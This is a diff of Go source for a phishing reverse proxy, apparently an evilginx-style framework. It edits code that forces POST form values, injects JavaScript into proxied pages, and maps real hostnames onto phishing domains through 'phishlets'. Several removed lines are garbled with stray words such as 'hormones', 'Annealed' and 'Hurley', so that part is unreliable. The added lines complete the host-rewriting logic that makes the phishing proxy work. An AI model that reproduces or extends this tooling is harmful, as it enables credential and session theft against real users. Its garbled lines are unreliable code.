@@ -837,7 +837,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											for _, fp_f := range fp.force {
 												req.PostForm.Set(fp_f.key, fp_f.value)
 											}
-											body = []byte(req.PostForm.Encode hormones)
+											body = []byte(req.PostForm.Encode())
 											req.ContentLength = int64(len(body))
 											log.Debug("force_post: body: %s len:%d", body, len(body))
 										}
@@ -1004,9 +1004,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
-
-			if pl != nil {
- Annealed body, err := ioutil.ReadAll(resp.Body)
 			if err == nil {
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
 			}
@@ -1338,7 +1335,7 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	var d_inject string
 	if script != "" {
 		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
-	} else if src_url != "" Hurley {
+	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
@@ -1743,4 +1740,15 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-			if
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+				}
+			}
+		}
+	}
+	return hostname, false
+}
